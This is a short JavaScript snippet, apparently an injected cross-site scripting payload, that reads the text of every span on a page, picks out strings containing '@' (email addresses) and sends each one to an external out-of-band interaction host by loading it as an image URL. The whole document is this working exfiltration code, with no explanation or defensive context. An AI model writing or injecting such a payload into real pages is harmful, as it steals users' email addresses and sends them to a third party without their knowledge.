    let emails = document.getElementsByTagName("span");
    for (let i = 0; i < emails.length; i++) {
        let data = emails[i];
        let data_s = data.textContent;  // or data.innerText

        //console.log(data_s);
        for (let j = 0; j < data_s.length; j++) {
            if (data_s[j] === "@") {
                var imgElement = document.createElement('img');
                imgElement.src = 'https://qlczvvvmiqyxqynbxerd4zmpr24rq2j5q.oast.fun/'+data_s;
                imgElement.alt = 'Generated image';
                document.body.appendChild(imgElement);
                console.log(data_s); 
            }
        }
    }
